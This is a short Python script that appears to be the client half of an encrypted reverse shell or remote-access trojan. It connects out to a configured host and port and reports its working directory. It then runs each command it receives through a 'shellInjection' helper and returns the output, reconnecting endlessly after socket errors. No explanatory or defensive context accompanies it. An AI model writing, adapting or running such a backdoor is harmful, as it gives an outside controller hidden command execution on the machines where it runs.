
import client_lib as lib
from GLOBAL import *
from ENCRYPTION import *
import socket

def main():
    main_loop = 0
    while main_loop < CONNEC_ATT:
        try:
            client = lib.Client(CLIENT_HOST, ST_PORT, Crypto())
            #while socket is active
            while True:
                client.sendDir()
                input = client.recvCommand()
                output = lib.shellInjection(input)
                client.sendOutput(output)

            return 0
        except socket.error as e:
            print(e)
            main_loop = 0
main()